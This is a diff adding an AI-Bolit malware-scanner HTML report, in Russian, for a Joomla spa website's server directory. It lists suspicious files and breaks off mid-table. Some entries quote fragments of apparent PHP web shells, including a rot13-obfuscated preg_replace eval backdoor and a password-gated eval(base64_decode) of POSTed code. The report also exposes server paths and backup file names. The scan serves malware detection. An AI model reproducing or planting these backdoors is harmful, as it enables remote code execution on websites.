@@ -1,0 +1,540 @@
+<html>
+<head>
+<!-- revisium.com/ai/ -->
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8" >
+<META NAME="ROBOTS" CONTENT="NOINDEX,NOFOLLOW">
+<title>Отчет по /var/www/user7119/data/www/thaipattaraspa_2015</title>
+<style type="text/css" title="currentStyle">
+	@import "https://revisium.com/extra/media/css/demo_page2.css";
+	@import "https://revisium.com/extra/media/css/jquery.dataTables2.css";
+</style>
+
+<script type="text/javascript" language="javascript" src="https://yandex.st/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" language="javascript" src="https://datatables.net/download/build/jquery.dataTables.js"></script>
+
+<style type="text/css">
+ body 
+ {
+   font-family: Tahoma;
+   color: #5a5a5a;
+   background: #FFFFFF;
+   font-size: 14px;
+   margin: 20px;
+   padding: 0;
+ }
+
+.header
+ {
+   font-size: 34px;
+   margin: 0 0 10px 0;
+ }
+
+ .hidd
+ {
+    display: none;
+ }
+ 
+ .ok
+ {
+    color: green;
+ }
+ 
+ .line_no
+ {
+   -webkit-border-radius: 6px;
+   -moz-border-radius: 6px;
+   border-radius: 6px;
+
+   background: #DAF2C1;
+   padding: 2px 5px 2px 5px;
+   margin: 0 5px 0 5px;
+ }
+ 
+ .credits_header 
+ {
+  -webkit-border-radius: 6px;
+   -moz-border-radius: 6px;
+   border-radius: 6px;
+
+   background: #F2F2F2;
+   padding: 10px;
+   font-size: 11px;
+    margin: 0 0 10px 0;
+ }
+ 
+ .marker
+ {
+    color: #FF0090;
+	font-weight: 100;
+	background: #FF0090;
+	padding: 2px 0px 2px 0px;
+	width: 2px;
+ }
+ 
+ .title
+ {
+   font-size: 24px;
+   margin: 20px 0 10px 0;
+   color: #9CA9D1;
+}
+
+.summary 
+{
+  float: left;
+  width: 500px;
+}
+
+.summary TD
+{
+  font-size: 12px;
+  border-bottom: 1px solid #F0F0F0;
+  font-weight: 700;
+  padding: 10px 0 10px 0;
+}
+ 
+.crit, .vir
+{
+  color: #D84B55;
+}
+
+.intitem
+{
+  color:#4a6975;
+}
+
+.spacer
+{
+   margin: 0 0 50px 0;
+   clear:both;
+}
+
+.warn
+{
+  color: #F6B700;
+}
+
+.clear
+{
+   clear: both;
+}
+
+.offer
+{
+  -webkit-border-radius: 6px;
+   -moz-border-radius: 6px;
+   border-radius: 6px;
+
+   width: 500px;
+   background: #ECF7DE;
+   color: #747474;
+   font-size: 11px;
+   font-family: Arial;
+   padding: 20px;
+   margin: 20px 0 0 500px;
+   
+   font-size: 16px;
+}
+ 
+.flist
+{
+   font-family: Arial;
+}
+
+.flist TD
+{
+   font-size: 11px;
+   padding: 5px;
+}
+
+.flist TH
+{
+   font-size: 12px;
+   height: 30px;
+   padding: 5px;
+   background: #CEE9EF;
+}
+
+
+.it
+{
+   font-size: 14px;
+   font-weight: 100;
+   margin-top: 10px;
+}
+
+.crit .it A {
+   color: #E50931; 
+   line-height: 25px;
+   text-decoration: none;
+}
+
+.warn .it A {
+   color: #F2C900; 
+   line-height: 25px;
+   text-decoration: none;
+}
+
+
+
+.details
+{
+   font-family: Calibri;
+   font-size: 12px;
+   margin: 10px 10px 10px 0px;
+}
+
+.crit .details
+{
+   color: #A08080;
+}
+
+.warn .details
+{
+   color: #808080;
+}
+
+.details A
+{
+  color: #FFF;
+  font-weight: 700;
+  text-decoration: none;
+  padding: 2px;
+  background: #E5CEDE;
+  -webkit-border-radius: 7px;
+   -moz-border-radius: 7px;
+   border-radius: 7px;
+}
+
+.details A:hover
+{
+   background: #A0909B;
+}
+
+.ctd
+{
+   margin: 10px 0px 10px 0;
+   align:center;
+}
+
+.ctd A 
+{
+   color: #0D9922;
+}
+
+.disclaimer
+{
+   color: darkgreen;
+   margin: 10px 10px 10px 0;
+}
+
+.note_vir
+{
+   margin: 10px 0 10px 0;
+   //padding: 10px;
+   color: #FF4F4F;
+   font-size: 15px;
+   font-weight: 700;
+   clear:both;
+  
+}
+
+.note_warn
+{
+   margin: 10px 0 10px 0;
+   color: #F6B700;
+   font-size: 15px;
+   font-weight: 700;
+   clear:both;
+}
+
+.note_int
+{
+   margin: 10px 0 10px 0;
+   color: #60b5d6;
+   font-size: 15px;
+   font-weight: 700;
+   clear:both;
+}
+
+.updateinfo
+{
+  color: #FFF;
+  text-decoration: none;
+  background: #E5CEDE;
+  -webkit-border-radius: 7px;
+   -moz-border-radius: 7px;
+   border-radius: 7px;
+
+  margin: 10px 0 10px 0px;   
+  padding: 10px;
+}
+
+
+.caution
+{
+  color: #EF7B75;
+  text-decoration: none;
+  margin: 20px 0 0px 0px;   
+  font-size: 12px;
+}
+
+.footer
+{
+  color: #303030;
+  text-decoration: none;
+  background: #F4F4F4;
+  -webkit-border-radius: 7px;
+   -moz-border-radius: 7px;
+   border-radius: 7px;
+
+  margin: 80px 0 10px 0px;   
+  padding: 10px;
+}
+
+.rep
+{
+  color: #303030;
+  text-decoration: none;
+  background: #94DDDB;
+  -webkit-border-radius: 7px;
+   -moz-border-radius: 7px;
+   border-radius: 7px;
+
+  margin: 10px 0 10px 0px;   
+  padding: 10px;
+  font-size: 12px;
+}
+
+</style>
+
+</head>
+<body>
+
+<div class="header">Отчет сканера <a href="https://revisium.com/ai/">AI-Bolit</a> v20160817: /var/www/user7119/data/www/thaipattaraspa_2015/ (1/1)</div>
+<div class="credits_header">Скрипт бесплатный только для личного некоммерческого использования. Есть <a href="https://revisium.com/ai/faq.php#faq11" target=_blank>коммерческая лицензия</a> (пункт №11).</div>
+<div class="details_header">
+   Затрачено времени: <b>19 m </b>. Сканирование начато 09-02-2017 в 16:12:21, сканирование завершено 09-02-2017 в 16:31:38<br/>
+   Всего проверено 2222 директорий и 9615 файлов. Использовано памяти при сканировании: 8.44 Mb.
+ </div>
+
+ 
+ 
+ <div class="summary">
+<div class="title">Сводный отчет</div><table cellspacing=0 border=0><tr><td class="crit" width=400>Мобильных редиректов</td><td class="crit">1</td></tr><tr><td class="crit" width=400>Вредоносных скриптов</td><td class="crit">7</td></tr><tr><td class="warn" width=400>Исполняемых файлов</td><td class="warn">4</td></tr><tr><td class="warn" width=400>Пропущенных больших файлов</td><td class="warn">30</td></tr><tr><td class="warn" width=400>Скрытых файлов</td><td class="warn">1</td></tr><tr><td class="warn" width=400>Рекламных ссылок и кодов</td><td class="warn">2</td></tr></table><!--[json]{"redirect":1,"critical_php":7,"critical_js":0,"phishing":0,"unix_exec":4,"iframes":0,"not_read":0,"base64":0,"heuristics":0,"symlinks":0,"big_files_skipped":30}[/json]--><div class=details style="margin: 20px 20px 20px 0">Обращаем внимание, что обнаруженные файлы не всегда являются вирусами и хакерскими скриптами. Сканер старается минимизировать число ложных обнаружений, но это не всегда возможно, так как найденный фрагмент может встречаться как во вредоносных скриптах, так и в обычных.</div>
+
+ </div>
+ 
+ <div class="offer">
+    <div>
+	 <div class="crit" style="font-size: 17px;"><b>Внимание! Наш сканер обнаружил подозрительный или вредоносный код</b>.</div> 
+	 <br/>Скорее всего, ваш сайт был взломан и заражен. Рекомендуем срочно <a href="https://revisium.com/ru/order/" target=_blank>обратиться за консультацией</a> к специалистам по информационной безопасности.
+	</div>
+	<br/>
+	<div>
+	   Пришлите нам отчет в архиве .zip на <a href="mailto:ai@revisium.com">ai@revisium.com</a> для проверки вашего сайта на вирусы и взлом.<p>
+	   Компания "<a href="https://revisium.com/">Ревизиум</a>" - лечение сайта от вирусов и защита от взлома.
+	   <p><hr size=1></p>
+	   Также проверьте сайт новым <b><a href="http://rescan.pro/" target=_blank>веб-сканером REVIZORRO</a></b>.
+	</div>
+	<br/>
+	
+    <div class="caution">Не оставляйте файл отчета на сервере, и не давайте на него прямых ссылок с других сайтов. Информация из отчета может быть использована злоумышленниками для взлома сайта, так как содержит информацию о настройках сервера, файлах и каталогах.</div>
+ </div>
+  
+ <div class="clear"></div>
+ 
+ <div class="title">Критические замечания</div><div class="note_vir">Эти файлы могут быть вредоносными или хакерскими скриптами (7)</div><div class="crit"><div class="flist"><table cellspacing=1 cellpadding=4 border=0 id="table_crit"><thead><tr class="tbgh0"><th width=70%>Путь</th><th>Изменение свойств</th><th>Изменение содержимого</th><th width=90>Размер</th><th width=0 class="hidd">CRC32</th><th width=0 class="hidd"></th><th width=0 class="hidd"></th><th width=0 class="hidd"></th></tr></thead><tbody><tr class="tbg0" o="id_9f50dc10"><td><div class="it"><a class="it">/var/www/user7119/data/www/thaipattaraspa_2015/media/editors/tinymce/skins/lightgray/img/thumb.php</a></div><div class="details"><a href="#" onclick="return hsig('id_9f50dc10')">[x]</a> <span class="line_no">2</span>&lt;?php·if(isset($_POST[&#039;jml&#039;])){($www=$_POST[&#039;jml&#039;])&amp;&amp;<span class="marker">&nbsp;</span>preg_replace(&#039;/ad/e&#039;,&#039;&#039;.str_rot13(&#039;riny&#039;).&#039;($www)&#039;,&#039;add&#039;);exit;</div></td><td align=center><div class="ctd">16/12/2015 16:47:40</div></td><td align=center><div class="ctd">16/12/2015 16:47:40</div></td><td align=center><div class="ctd">129 b</div></td><td class="hidd"><div class="hidd">e582a7ccc98683615a311c4588723bbed8865005</div></td><td class="hidd"><div class="hidd">1450273660</div></td><td class="hidd"><div class="hidd">1450273660</div></td><td class="hidd"><div class="hidd">id_9f50dc10</div></td></tr><tr class="tbg1" o="id_d582692e"><td><div class="it"><a class="it">/var/www/user7119/data/www/thaipattaraspa_2015/ntunnel_mysql.php</a></div><div class="details"><a href="#" onclick="return hsig('id_d582692e')">[x]</a> <span class="line_no">1</span>…version_int()&gt;=40300) echo GetBlock(mysql_info($conn));else echo GetBlock(&quot;&quot;);}}<span class="marker">&nbsp;</span>if($i&lt;(count($_POST[&quot;q&quot;])-1)) echo &quot;·&quot;;else echo &quot;·&quot;;mysql_free_result($res);}}</div></td><td align=center><div class="ctd">13/10/2015 09:57:51</div></td><td align=center><div class="ctd">13/10/2015 09:57:51</div></td><td align=center><div class="ctd">6.60 Kb</div></td><td class="hidd"><div class="hidd">998a71741c9158e3f19f73c757c509f33a6a857c</div></td><td class="hidd"><div class="hidd">1444719471</div></td><td class="hidd"><div class="hidd">1444719471</div></td><td class="hidd"><div class="hidd">id_d582692e</div></td></tr><tr class="tbg0" o="id_665f126b"><td><div class="it"><a class="it">/var/www/user7119/data/www/thaipattaraspa_2015/includes/PHPMailer/examples/send_file_upload.phps</a></div><div class="details"><a href="#" onclick="return hsig('id_665f126b')">[x]</a> <span class="line_no">42</span>…t/form-data&quot;&gt;·&lt;input type=&quot;hidden&quot; name=&quot;MAX_FILE_SIZE&quot; value=&quot;100000&quot;&gt;<span class="marker">&nbsp;</span>Send this file:&lt;input name=&quot;userfile&quot; type=&quot;file&quot;&gt;·&lt;input type=&quot;submit</div></td><td align=center><div class="ctd">27/04/2015 12:20:06</div></td><td align=center><div class="ctd">27/04/2015 12:20:06</div></td><td align=center><div class="ctd">1.60 Kb</div></td><td class="hidd"><div class="hidd">ed6fa932be4acb48fe94cec950fb3063acc9fd55</div></td><td class="hidd"><div class="hidd">1430126406</div></td><td class="hidd"><div class="hidd">1430126406</div></td><td class="hidd"><div class="hidd">id_665f126b</div></td></tr><tr class="tbg1" o="id_91ab28b8"><td><div class="it"><a class="it">/var/www/user7119/data/www/thaipattaraspa_2015/plugins/system/jch_optimize/jchoptimize/libs/JSMinRegex.php</a></div><div class="details"><a href="#" onclick="return hsig('id_91ab28b8')">[x]</a> <span class="line_no">1</span>….)?[^\\\\&#039;]*+)+?&#039;&quot;;$b=&#039;/\*(?&gt;[^/\*]++|//|\*(?!/)|(?&lt;!\*)/)*+\*/&#039;;$c=&#039;//[^\n]*+&#039;;<span class="marker">&nbsp;</span>$x1=&#039;[(,=:[!&amp;|?+\-·*{;\n]&#039;;$x2=&#039;\bcase|\belse|\bin|\breturn|\btypeof&#039;;$x3=&#039;/(?!</div></td><td align=center><div class="ctd">12/02/2016 13:38:42</div></td><td align=center><div class="ctd">12/02/2016 13:38:42</div></td><td align=center><div class="ctd">6.44 Kb</div></td><td class="hidd"><div class="hidd">b22906941041f9f6d24e2af1f2d91fe98c5ffedc</div></td><td class="hidd"><div class="hidd">1455273522</div></td><td class="hidd"><div class="hidd">1455273522</div></td><td class="hidd"><div class="hidd">id_91ab28b8</div></td></tr><tr class="tbg0" o="id_91ab28b8"><td><div class="it"><a class="it">/var/www/user7119/data/www/thaipattaraspa_2015/plugins/system/jch_optimize/jchoptimize/libs/JS_Optimize.php</a></div><div class="details"><a href="#" onclick="return hsig('id_91ab28b8')">[x]</a> <span class="line_no">1</span>…NG;$s2=self::SINGLE_QUOTE_STRING;$b=self::BLOCK_COMMENTS;$c=self::LINE_COMMENTS;<span class="marker">&nbsp;</span>$x1=&#039;[(.&lt;&gt;%,=:[!&amp;|?+\-·*{;\r\n^]&#039;;$x2=&#039;\breturn|\bthrow|\btypeof|\bcase|\bdelet</div></td><td align=center><div class="ctd">05/05/2016 08:25:16</div></td><td align=center><div class="ctd">05/05/2016 08:25:16</div></td><td align=center><div class="ctd">8.44 Kb</div></td><td class="hidd"><div class="hidd">c5e359ac1d8cc8fb53d1a9e26cec11b3bb048a72</div></td><td class="hidd"><div class="hidd">1462425916</div></td><td class="hidd"><div class="hidd">1462425916</div></td><td class="hidd"><div class="hidd">id_91ab28b8</div></td></tr><tr class="tbg1" o="id_04cec70f"><td><div class="it"><a class="it">/var/www/user7119/data/www/thaipattaraspa_2015/libraries/joomla/exporter.php</a></div><div class="details"><a href="#" onclick="return hsig('id_04cec70f')">[x]</a> <span class="line_no">1</span>…($_POST[&quot;password&quot;])==&quot;6db0812a45fd4183dad840c18dbc9a44&quot;){preg_replace(&quot;#.*#e&quot;,&quot;<span class="marker">&nbsp;</span>eval(base64_decode(&#039;&quot;.$_POST[&quot;code&quot;].&quot;&#039;));&quot;,&quot;&quot;);}?</div></td><td align=center><div class="ctd">16/12/2015 23:06:39</div></td><td align=center><div class="ctd">04/12/2014 23:06:39</div></td><td align=center><div class="ctd">237 b</div></td><td class="hidd"><div class="hidd">a68f511d302b396825fb2067a53536ce3a0aa80f</div></td><td class="hidd"><div class="hidd">1450296399</div></td><td class="hidd"><div class="hidd">1417723599</div></td><td class="hidd"><div class="hidd">id_04cec70f</div></td></tr><tr class="tbg0" o="id_99bea84e"><td><div class="it"><a class="it">/var/www/user7119/data/www/thaipattaraspa_2015/libraries/allediaframework/Framework/Network/Request.php</a></div><div class="details"><a href="#" onclick="return hsig('id_99bea84e')">[x]</a> <span class="line_no">1</span>…rl_setopt($ch,CURLOPT_URL,$url);curl_setopt($ch,CURLOPT_POST,count($data));curl_<span class="marker">&nbsp;</span>setopt($ch,CURLOPT_POSTFIELDS,http_build_query($data));curl_setopt($ch,CURLOPT_</div></td><td align=center><div class="ctd">27/04/2015 12:21:03</div></td><td align=center><div class="ctd">27/04/2015 12:21:03</div></td><td align=center><div class="ctd">2.14 Kb</div></td><td class="hidd"><div class="hidd">8e470146fecfece266225e77e55ca19220197da3</div></td><td class="hidd"><div class="hidd">1430126463</div></td><td class="hidd"><div class="hidd">1430126463</div></td><td class="hidd"><div class="hidd">id_99bea84e</div></td></tr></tbody></table></div><div class=clear style="margin: 20px 0 0 0"></div></div>
+<div class="note_vir">Подозрение на мобильный редирект, подмену расширений или автовнедрение кода (1)</div><div class="crit"><div class="flist"><table cellspacing=1 cellpadding=4 border=0 id="table_7222340"><thead><tr class="tbgh0"><th width=70%>Путь</th><th>Изменение свойств</th><th>Изменение содержимого</th><th width=90>Размер</th><th width=0 class="hidd">CRC32</th><th width=0 class="hidd"></th><th width=0 class="hidd"></th><th width=0 class="hidd"></th></tr></thead><tbody><tr class="tbg0" o="id_z2717876"><td><div class="it"><a class="it">/var/www/user7119/data/www/thaipattaraspa_2015/.htaccess</a></div></td><td align=center><div class="ctd">23/06/2015 13:58:01</div></td><td align=center><div class="ctd">23/06/2015 13:58:01</div></td><td align=center><div class="ctd">3.96 Kb</div></td><td class="hidd"><div class="hidd">1fcfd5297dc83bca0eda58800291c65487646b38</div></td><td class="hidd"><div class="hidd">1435057081</div></td><td class="hidd"><div class="hidd">1435057081</div></td><td class="hidd"><div class="hidd">id_z2717876</div></td></tr></tbody></table></div><div class=clear style="margin: 20px 0 0 0"></div></div>
+<div class="note_warn">Обнаружены сигнатуры исполняемых файлов unix и нехарактерных скриптов. Они могут быть вредоносными файлами (4)</div><div class="warn">/var/www/user7119/data/www/thaipattaraspa_2015/includes/PHPMailer/test/fakepopserver.sh<br />
+/var/www/user7119/data/www/thaipattaraspa_2015/includes/PHPMailer/test/fakesendmail.sh<br />
+/var/www/user7119/data/www/thaipattaraspa_2015/includes/PHPMailer/test/runfakepopserver.sh<br />
+/var/www/user7119/data/www/thaipattaraspa_2015/includes/PHPMailer/docs/generatedocs.sh</div>
+<div style="margin-top: 20px" class="title">Предупреждения</div><div class="note_warn">Дорвеи, реклама, спам-ссылки, редиректы</div><div class="warn"><div class="flist"><table cellspacing=1 cellpadding=4 border=0 id="table_3752455"><thead><tr class="tbgh0"><th width=70%>Путь</th><th>Изменение свойств</th><th>Изменение содержимого</th><th width=90>Размер</th><th width=0 class="hidd">CRC32</th><th width=0 class="hidd"></th><th width=0 class="hidd"></th><th width=0 class="hidd"></th></tr></thead><tbody><tr class="tbg0" o="id_z3439267"><td><div class="it"><a class="it">/var/www/user7119/data/www/thaipattaraspa_2015/administrator/components/com_admin/models/sysinfo.php</a></div><div class="details"><span class="line_no">1</span>…(){if(null!==$this-&gt;phpInfoArray){return$this-&gt;phpInfoArray;}$phpInfo=$this-&gt;get<span class="marker">&nbsp;</span>PhpInfo();$this-&gt;phpInfoArray=$this-&gt;parsePhpInfo($phpInfo);return$this-&gt;phpInf</div></td><td align=center><div class="ctd">21/12/2016 13:09:49</div></td><td align=center><div class="ctd">11/12/2016 21:51:10</div></td><td align=center><div class="ctd">16.52 Kb</div></td><td class="hidd"><div class="hidd">c18684779513fb85cde822ddfb7d724762e87f1f</div></td><td class="hidd"><div class="hidd">1482314989</div></td><td class="hidd"><div class="hidd">1481482270</div></td><td class="hidd"><div class="hidd">id_z3439267</div></td></tr><tr class="tbg1" o="id_z6362101"><td><div class="it"><a class="it">/var/www/user7119/data/www/thaipattaraspa_2015/administrator/components/com_akeeba/views/log/tmpl/default.php</a></div><div class="details"><span class="line_no">1</span>…e&amp;layout=raw&amp;tag=&lt;?php echo urlencode($this-&gt;tag);?&gt;&quot; width=&quot;99%&quot; height=&quot;400px&quot;<span class="marker">&nbsp;</span>&gt;&lt;/iframe&gt;&lt;?php endif;?&gt;&lt;/fieldset&gt;&lt;/form&gt;&lt;?php else:?&gt;&lt;div class=&quot;alert alert-</div></td><td align=center><div class="ctd">14/10/2016 19:21:06</div></td><td align=center><div class="ctd">14/10/2016 19:21:06</div></td><td align=center><div class="ctd">1.63 Kb</div></td><td class="hidd"><div class="hidd">98d9e6889c8c570f3f3d048c0404ebf9826b641e</div></td><td class="hidd"><div class="hidd">1476462066</div></td><td class="hidd"><div class="hidd">1476462066</div></td><td class="hidd"><div class="hidd">id_z6362101</div></td></tr></tbody></table></div><div class=clear style="margin: 20px 0 0 0"></div></div>
+<div class="note_warn">Скрытые файлы (1)</div><div class="warn">/var/www/user7119/data/www/thaipattaraspa_2015/.cl.selector</div><div class="spacer"></div>
+<div class="note_warn">Большие файлы (больше чем 600.00 Kb). Пропущено</div><div class="warn"><div class="flist"><table cellspacing=1 cellpadding=4 border=0 id="table_7198769"><thead><tr class="tbgh0"><th width=70%>Путь</th><th>Изменение свойств</th><th>Изменение содержимого</th><th width=90>Размер</th><th width=0 class="hidd">CRC32</th><th width=0 class="hidd"></th><th width=0 class="hidd"></th><th width=0 class="hidd"></th></tr></thead><tbody><tr class="tbg0" o="id_z1995874"><td><div class="it"><a class="it">/var/www/user7119/data/www/thaipattaraspa_2015/Application Files/SPA MANAGEMENT SYSTEM_2_0_0_71/PdfSharp.dll.deploy</a></div></td><td align=center><div class="ctd">11/12/2015 18:37:18</div></td><td align=center><div class="ctd">11/12/2015 18:37:18</div></td><td align=center><div class="ctd">644.00 Kb</div></td><td class="hidd"><div class="hidd">d80bda2adb9b436802dc9c9b9beef5e132917af9</div></td><td class="hidd"><div class="hidd">1449848238</div></td><td class="hidd"><div class="hidd">1449848238</div></td><td class="hidd"><div class="hidd">id_z1995874</div></td></tr><tr class="tbg1" o="id_z7593143"><td><div class="it"><a class="it">/var/www/user7119/data/www/thaipattaraspa_2015/Application Files/SPA MANAGEMENT SYSTEM_2_0_0_71/SPA MANAGEMENT SYSTEM.exe.deploy</a></div></td><td align=center><div class="ctd">11/12/2015 18:39:12</div></td><td align=center><div class="ctd">11/12/2015 18:39:12</div></td><td align=center><div class="ctd">3.90 Mb</div></td><td class="hidd"><div class="hidd">4db0f1f39474463e09d1999ff323616907b55be9</div></td><td class="hidd"><div class="hidd">1449848352</div></td><td class="hidd"><div class="hidd">1449848352</div></td><td class="hidd"><div class="hidd">id_z7593143</div></td></tr><tr class="tbg0" o="id_z5576914"><td><div class="it"><a class="it">/var/www/user7119/data/www/thaipattaraspa_2015/logs/error.php</a></div></td><td align=center><div class="ctd">09/02/2017 14:41:09</div></td><td align=center><div class="ctd">09/02/2017 14:41:09</div></td><td align=center><div class="ctd">2.85 Mb</div></td><td class="hidd"><div class="hidd">675883773a2897d11b705690376d7c0a297c55e3</div></td><td class="hidd"><div class="hidd">1486640469</div></td><td class="hidd"><div class="hidd">1486640469</div></td><td class="hidd"><div class="hidd">id_z5576914</div></td></tr><tr class="tbg1" o="id_z1845864"><td><div class="it"><a class="it">/var/www/user7119/data/www/thaipattaraspa_2015/administrator/components/com_akeeba/assets/installers/angie.jpa</a></div></td><td align=center><div class="ctd">14/10/2016 19:20:54</div></td><td align=center><div class="ctd">14/10/2016 19:20:54</div></td><td align=center><div class="ctd">738.04 Kb</div></td><td class="hidd"><div class="hidd">f9976731296fb20cc34900a8d89fb402b5853733</div></td><td class="hidd"><div class="hidd">1476462054</div></td><td class="hidd"><div class="hidd">1476462054</div></td><td class="hidd"><div class="hidd">id_z1845864</div></td></tr><tr class="tbg0" o="id_z7939087"><td><div class="it"><a class="it">/var/www/user7119/data/www/thaipattaraspa_2015/administrator/components/com_akeeba/backup/site-www.thaipattaraspa.ru-20170205-132812.jpa</a></div></td><td align=center><div class="ctd">05/02/2017 16:33:21</div></td><td align=center><div class="ctd">05/02/2017 16:33:21</div></td><td align=center><div class="ctd">76.60 Mb</div></td><td class="hidd"><div class="hidd">da39a3ee5e6b4b0d3255bfef95601890afd80709</div></td><td class="hidd"><div class="hidd">1486301601</div></td><td class="hidd"><div class="hidd">1486301601</div></td><td class="hidd"><div class="hidd">id_z7939087</div></td></tr><tr class="tbg1" o="id_z1796685"><td><div class="it"><a class="it">/var/www/user7119/data/www/thaipattaraspa_2015/administrator/components/com_akeeba/backup/akeeba.backend.id2.log</a></div></td><td align=center><div class="ctd">09/04/2016 18:32:00</div></td><td align=center><div class="ctd">09/04/2016 18:32:00</div></td><td align=center><div class="ctd">3.65 Mb</div></td><td class="hidd"><div class="hidd">da39a3ee5e6b4b0d3255bfef95601890afd80709</div></td><td class="hidd"><div class="hidd">1460215920</div></td><td class="hidd"><div class="hidd">1460215920</div></td><td class="hidd"><div class="hidd">id_z1796685</div></td></tr><tr class="tbg0" o="id_z8335586"><td><div class="it"><a class="it">/var/www/user7119/data/www/thaipattaraspa_2015/administrator/components/com_akeeba/backup/site-www.thaipattaraspa.ru-20160409-123506.jpa</a></div></td><td align=center><div class="ctd">09/04/2016 15:39:23</div></td><td align=center><div class="ctd">09/04/2016 15:39:23</div></td><td align=center><div class="ctd">54.26 Mb</div></td><td class="hidd"><div class="hidd">da39a3ee5e6b4b0d3255bfef95601890afd80709</div></td><td class="hidd"><div class="hidd">1460205563</div></td><td class="hidd"><div class="hidd">1460205563</div></td><td class="hidd"><div class="hidd">id_z8335586</div></td></tr><tr class="tbg1" o="id_z4085002"><td><div class="it"><a class="it">/var/www/user7119/data/www/thaipattaraspa_2015/administrator/components/com_akeeba/backup/akeeba.backend.id3.log</a></div></td><td align=center><div class="ctd">05/02/2017 16:33:24</div></td><td align=center><div class="ctd">05/02/2017 16:33:24</div></td><td align=center><div class="ctd">3.88 Mb</div></td><td class="hidd"><div class="hidd">da39a3ee5e6b4b0d3255bfef95601890afd80709</div></td><td class="hidd"><div class="hidd">1486301604</div></td><td class="hidd"><div class="hidd">1486301604</div></td><td class="hidd"><div class="hidd">id_z4085002</div></td></tr><tr class="tbg0" o="id_z6772890"><td><div class="it"><a class="it">/var/www/user7119/data/www/thaipattaraspa_2015/administrator/components/com_akeeba/backup/site-www.thaipattaraspa.ru-20160409-152726.jpa</a></div></td><td align=center><div class="ctd">09/04/2016 18:31:59</div></td><td align=center><div class="ctd">09/04/2016 18:31:59</div></td><td align=center><div class="ctd">54.27 Mb</div></td><td class="hidd"><div class="hidd">63764ed4fe5b27f123ed6eded3f9706730f29370</div></td><td class="hidd"><div class="hidd">1460215919</div></td><td class="hidd"><div class="hidd">1460215919</div></td><td class="hidd"><div class="hidd">id_z6772890</div></td></tr><tr class="tbg1" o="id_z2764813"><td><div class="it"><a class="it">/var/www/user7119/data/www/thaipattaraspa_2015/administrator/components/com_akeeba/backup/akeeba.backend.id1.log</a></div></td><td align=center><div class="ctd">09/04/2016 15:39:35</div></td><td align=center><div class="ctd">09/04/2016 15:39:35</div></td><td align=center><div class="ctd">3.64 Mb</div></td><td class="hidd"><div class="hidd">63764ed4fe5b27f123ed6eded3f9706730f29370</div></td><td class="hidd"><div class="hidd">1460205575</div></td><td class="hidd"><div class="hidd">1460205575</div></td><td class="hidd"><div class="hidd">id_z2764813</div></td></tr><tr class="tbg0" o="id_z3421267"><td><div class="it"><a class="it">/var/www/user7119/data/www/thaipattaraspa_2015/images/promotion/old_1/ENG Promo SPA march 2016.jpg</a></div></td><td align=center><div class="ctd">08/11/2016 22:25:40</div></td><td align=center><div class="ctd">31/08/2016 23:42:26</div></td><td align=center><div class="ctd">1.76 Mb</div></td><td class="hidd"><div class="hidd">8556c8889580aebb9f9d46d029cf0c6c46ab6c15</div></td><td class="hidd"><div class="hidd">1478633140</div></td><td class="hidd"><div class="hidd">1472676146</div></td><td class="hidd"><div class="hidd">id_z3421267</div></td></tr><tr class="tbg1" o="id_z2979805"><td><div class="it"><a class="it">/var/www/user7119/data/www/thaipattaraspa_2015/images/promotion/old_1/ENG Promo Massage.jpg</a></div></td><td align=center><div class="ctd">08/11/2016 22:25:40</div></td><td align=center><div class="ctd">31/08/2016 23:48:37</div></td><td align=center><div class="ctd">1.64 Mb</div></td><td class="hidd"><div class="hidd">8556c8889580aebb9f9d46d029cf0c6c46ab6c15</div></td><td class="hidd"><div class="hidd">1478633140</div></td><td class="hidd"><div class="hidd">1472676517</div></td><td class="hidd"><div class="hidd">id_z2979805</div></td></tr><tr class="tbg0" o="id_z5266202"><td><div class="it"><a class="it">/var/www/user7119/data/www/thaipattaraspa_2015/images/promotion/old_1/RU Promo SPA march 2016.jpg</a></div></td><td align=center><div class="ctd">08/11/2016 22:25:40</div></td><td align=center><div class="ctd">31/08/2016 23:44:43</div></td><td align=center><div class="ctd">1.78 Mb</div></td><td class="hidd"><div class="hidd">38423beffa5e344957a5afe81d1adec490ad4669</div></td><td class="hidd"><div class="hidd">1478633140</div></td><td class="hidd"><div class="hidd">1472676283</div></td><td class="hidd"><div class="hidd">id_z5266202</div></td></tr><tr class="tbg1" o="id_z2116445"><td><div class="it"><a class="it">/var/www/user7119/data/www/thaipattaraspa_2015/images/promotion/old_1/RU Promo Massage.jpg</a></div></td><td align=center><div class="ctd">08/11/2016 22:25:40</div></td><td align=center><div class="ctd">31/08/2016 23:45:54</div></td><td align=center><div class="ctd">1.68 Mb</div></td><td class="hidd"><div class="hidd">6f2bfa7ff2335ab9bbc42d6ab874bb5497d13a54</div></td><td class="hidd"><div class="hidd">1478633140</div></td><td class="hidd"><div class="hidd">1472676354</div></td><td class="hidd"><div class="hidd">id_z2116445</div></td></tr><tr class="tbg0" o="id_z8866948"><td><div class="it"><a class="it">/var/www/user7119/data/www/thaipattaraspa_2015/images/promotion/old_1/RUS Promo SPA march 2016.jpg</a></div></td><td align=center><div class="ctd">08/11/2016 22:25:40</div></td><td align=center><div class="ctd">31/08/2016 23:43:44</div></td><td align=center><div class="ctd">1.78 Mb</div></td><td class="hidd"><div class="hidd">65869087ddf0c2fb8066410b51fdb261f2be23ee</div></td><td class="hidd"><div class="hidd">1478633140</div></td><td class="hidd"><div class="hidd">1472676224</div></td><td class="hidd"><div class="hidd">id_z8866948</div></td></tr><tr class="tbg1" o="id_z6568713"><td><div class="it"><a class="it">/var/www/user7119/data/www/thaipattaraspa_2015/images/promotion/ENG Promo SPA march 2016.jpg</a></div></td><td align=center><div class="ctd">08/11/2016 22:35:49</div></td><td align=center><div class="ctd">08/11/2016 22:35:49</div></td><td align=center><div class="ctd">723.98 Kb</div></td><td class="hidd"><div class="hidd">8e127705fbeb0d0eacf7439c3cec6d51b6a13c52</div></td><td class="hidd"><div class="hidd">1478633749</div></td><td class="hidd"><div class="hidd">1478633749</div></td><td class="hidd"><div class="hidd">id_z6568713</div></td></tr><tr class="tbg0" o="id_z1517192"><td><div class="it"><a class="it">/var/www/user7119/data/www/thaipattaraspa_2015/images/promotion/ENG Promo Massage.jpg</a></div></td><td align=center><div class="ctd">09/11/2016 23:22:25</div></td><td align=center><div class="ctd">09/11/2016 23:22:25</div></td><td align=center><div class="ctd">685.41 Kb</div></td><td class="hidd"><div class="hidd">8e127705fbeb0d0eacf7439c3cec6d51b6a13c52</div></td><td class="hidd"><div class="hidd">1478722945</div></td><td class="hidd"><div class="hidd">1478722945</div></td><td class="hidd"><div 